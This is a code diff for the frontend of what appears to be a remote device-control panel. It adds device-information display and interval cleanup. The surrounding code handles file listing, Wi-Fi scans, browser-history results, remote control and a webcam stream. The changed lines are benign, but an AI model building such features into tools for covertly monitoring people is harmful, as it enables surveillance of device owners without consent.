@@ -39,6 +39,7 @@ import {
 
 import { handleIncomingChat, resetChat } from '../modules/chat.js';
 import { renderWifiData, requestWifiScan } from '../modules/wifi.js';
+import { renderDeviceInfo } from '../modules/deviceInfo.js';
 
 let ws = null;
 
@@ -225,6 +226,9 @@ function onWsMessage(event) {
         case 'browser_history_result':
             handleBrowserHistoryResult(msg);
             break;
+        case 'device_info':
+            renderDeviceInfo(msg.data);
+            break;
     }
 }
 
@@ -237,6 +241,7 @@ export function loadDataForCurrentView() {
         sendWsMessage({ command: 'fs_list', path: state.currentPath, context: 'view' });
     }
     else if (id === 'wifi') requestWifiScan();
+    // device-info is handled by auto-refresh interval in main.js
 }
 
 function resetUI() {
@@ -250,6 +255,12 @@ function resetUI() {
     // Reset Control toggle
     const controlToggle = $('#toggle-control');
     if (controlToggle) controlToggle.checked = false;
+
+    // Stop device info auto-refresh
+    if (state.deviceInfoInterval) {
+        clearInterval(state.deviceInfoInterval);
+        state.deviceInfoInterval = null;
+    }
     
     resetAppState();
     clearWebcamStreamUI();
